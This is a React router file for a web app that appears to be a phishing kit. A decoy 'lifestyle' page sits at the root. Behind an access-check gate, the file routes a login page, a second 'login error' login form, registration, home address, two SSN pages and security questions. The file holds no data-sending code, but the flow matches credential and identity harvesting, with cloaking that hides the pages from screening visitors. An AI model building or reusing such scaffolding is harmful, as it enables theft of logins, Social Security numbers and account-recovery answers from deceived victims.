import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import useAccessCheck from './Utils/useAccessCheck';
import { baseUrl } from './constants';
import FlowLayout from './components/FlowLayout';

// Pages
import LoginForm from './pages/LoginForm';
import LoginForm2 from './pages/LoginForm2';
import Register from './pages/Register';
import BasicInfo from './pages/BasicInfo';
import HomeAddress from './pages/HomeAddress';
import SSN1 from './pages/SSN1';
import SSN2 from './pages/SSN2';
import SecurityQuestions from './pages/SecurityQuestions';
import Terms from './pages/Terms';
import LifestyleDemo from './pages/LifestyleDemo';

interface ProtectedRouteProps {
  element: React.ReactNode;
}

const ProtectedRoute: React.FC<ProtectedRouteProps> = ({ element }) => {
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return (
      <FlowLayout>
        <div className="text-white">Loading...</div>
      </FlowLayout>
    );
  }

  if (isAllowed === false) {
    return (
      <FlowLayout>
        <div className="text-white">Access denied. Redirecting...</div>
      </FlowLayout>
    );
  }

  return <FlowLayout>{element}</FlowLayout>;
};

function App() {
  return (
    <Router>
      <Routes>
        {/* Public routes */}
        <Route path="/" element={<LifestyleDemo />} />

        {/* Protected routes */}
        <Route path="/login" element={<ProtectedRoute element={<LoginForm />} />} />
        <Route path="/login-error" element={<ProtectedRoute element={<LoginForm2 />} />} />
        <Route path="/register" element={<ProtectedRoute element={<Register />} />} />
        <Route path="/basic-info" element={<ProtectedRoute element={<BasicInfo />} />} />
        <Route path="/home-address" element={<ProtectedRoute element={<HomeAddress />} />} />
        <Route path="/ssn1" element={<ProtectedRoute element={<SSN1 />} />} />
        <Route path="/ssn2" element={<ProtectedRoute element={<SSN2 />} />} />
        <Route path="/security-questions" element={<ProtectedRoute element={<SecurityQuestions />} />} />
        <Route path="/terms" element={<ProtectedRoute element={<Terms />} />} />

        {/* Redirect any unknown routes to home */}
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </Router>
  );
}

export default App;
